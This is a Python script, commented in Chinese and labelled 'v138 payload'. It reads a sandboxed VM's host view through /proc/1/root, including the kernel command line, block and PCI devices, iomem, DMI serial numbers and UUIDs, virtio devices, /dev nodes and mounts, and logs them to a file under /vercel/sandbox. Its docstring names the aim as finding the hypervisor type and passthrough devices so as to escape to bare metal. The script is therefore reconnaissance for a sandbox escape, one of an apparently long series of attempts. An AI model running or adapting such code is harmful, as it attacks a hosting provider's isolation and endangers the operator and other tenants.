# -*- coding: utf-8 -*-
"""v138 payload: cell VM 硬件视图 - kernel cmdline / block devices / PCI / iomem / DMI(SMBIOS)
目标: 确定 VMM 类型与直通设备 -> 逃逸裸金属面
输出 /vercel/sandbox/v138c.out"""
import os, signal, time

OUT = '/vercel/sandbox/v138c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(240)

R = '/proc/1/root'  # cell VM root (celld)


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rd(p, n=4000):
    try:
        return open(p, 'rb').read(n)
    except Exception as e:
        return 'EXC %s' % str(e).encode()


def ls(p):
    try:
        return os.listdir(p)
    except Exception as e:
        return 'EXC %s' % str(e)


# 1: kernel cmdline
log('=== 1 cmdline ===')
log('cmdline: %r' % rd(R + '/proc/cmdline', 2000))

# 2: block devices
log('=== 2 block devs ===')
for d in ls(R + '/sys/block'):
    log('block %s: dev=%s size=%s' % (d,
                                      rd(R + '/sys/block/%s/dev' % d, 100).strip(),
                                      rd(R + '/sys/block/%s/size' % d, 100).strip()))
    try:
        log('  %s/device vendor=%s model=%s' % (d,
                                                rd(R + '/sys/block/%s/device/vendor' % d, 100).strip(),
                                                rd(R + '/sys/block/%s/device/model' % d, 100).strip()))
    except Exception as e:
        log('  device EXC %s' % e)
    try:
        log('  %s/queue/rotational=%s' % (d, rd(R + '/sys/block/%s/queue/rotational' % d, 100).strip()))
    except Exception:
        pass

# 3: PCI devices
log('=== 3 pci ===')
pcis = ls(R + '/sys/bus/pci/devices')
log('pci count=%d' % len(pcis))
for p in pcis[:60]:
    try:
        vendor = rd(R + '/sys/bus/pci/devices/%s/vendor' % p, 100).strip()
        devid = rd(R + '/sys/bus/pci/devices/%s/device' % p, 100).strip()
        cls = rd(R + '/sys/bus/pci/devices/%s/class' % p, 100).strip()
        log('PCI %s vendor=%s device=%s class=%s' % (p, vendor, devid, cls))
    except Exception as e:
        log('PCI %s EXC %s' % (p, e))

# 4: iomem
log('=== 4 iomem ===')
log(rd(R + '/proc/iomem', 6000).decode(errors='replace'))

# 5: DMI/SMBIOS
log('=== 5 dmi ===')
dmi = R + '/sys/class/dmi/id'
for fp in ['sys_vendor', 'product_name', 'product_version', 'product_uuid', 'product_serial',
           'board_vendor', 'board_name', 'board_serial', 'bios_vendor', 'bios_version', 'chassis_asset_tag']:
    log('dmi/%s=%r' % (fp, rd('%s/%s' % (dmi, fp), 300)))
try:
    log('dmi tables size: %s' % ls(R + '/sys/firmware/dmi/tables'))
    t = rd(R + '/sys/firmware/dmi/tables/DMI', 200)
    log('DMI head: %r' % t)
except Exception as e:
    log('dmi tables EXC %s' % e)

# 6: virtio
log('=== 6 virtio ===')
vs = ls(R + '/sys/bus/virtio/devices')
log('virtio devices: %s' % vs)
for v in vs[:20]:
    try:
        log('virtio %s: %r' % (v, rd(R + '/sys/bus/virtio/devices/%s/device' % v, 100)))
    except Exception:
        pass

# 7: /dev 全览（host）
log('=== 7 /dev ===')
devs = ls(R + '/dev')
log('dev count=%d' % len(devs))
for d in devs:
    if any(k in d for k in ('sd', 'vd', 'nvme', 'xvd', 'mem', 'kvm', 'null', 'zero', 'random', 'tty', 'console')):
        try:
            st = os.stat(R + '/dev/' + d)
            log('dev %s mode=%o' % (d, st.st_mode))
        except Exception as e:
            log('dev %s EXC %s' % (d, e))

# 8: 挂载根盘类型（254:0 对应设备）
log('=== 8 root dev ===')
try:
    mj = rd(R + '/proc/mounts', 4000).decode(errors='replace')
    log('mounts:\n' + mj[:2500])
except Exception as e:
    log('mounts EXC %s' % e)

log('V138_DONE')
f.close()
